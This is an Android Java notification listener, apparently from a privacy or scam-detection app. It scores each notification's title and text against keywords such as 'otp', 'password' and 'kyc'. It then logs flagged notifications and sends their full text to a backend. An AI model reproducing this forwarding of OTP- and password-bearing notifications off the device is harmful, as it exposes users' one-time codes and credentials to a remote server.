package com.privacyguardian.mobile;

import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;

public class NotificationMonitorService extends NotificationListenerService {
    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        if (!AppSettings.realtimeEnabled(this) || sbn == null || sbn.getNotification() == null || sbn.getNotification().extras == null) {
            return;
        }
        CharSequence title = sbn.getNotification().extras.getCharSequence("android.title");
        CharSequence text = sbn.getNotification().extras.getCharSequence("android.text");
        String summary = "Package=" + sbn.getPackageName() + " title=" + safe(title) + " text=" + safe(text);
        String lower = summary.toLowerCase();
        int score = 0;
        if (lower.contains("otp") || lower.contains("password") || lower.contains("kyc") || lower.contains("http")) score += 45;
        if (lower.contains("urgent") || lower.contains("blocked") || lower.contains("verify")) score += 25;
        if (score > 0) {
            ScanHistory.append(this, "notification", score >= 45 ? "Review" : "Info", score, summary);
            BackendClient.sendAuditAsync(this, "notification", "Review", score, summary);
        }
    }

    private String safe(CharSequence value) {
        return value == null ? "" : value.toString();
    }
}
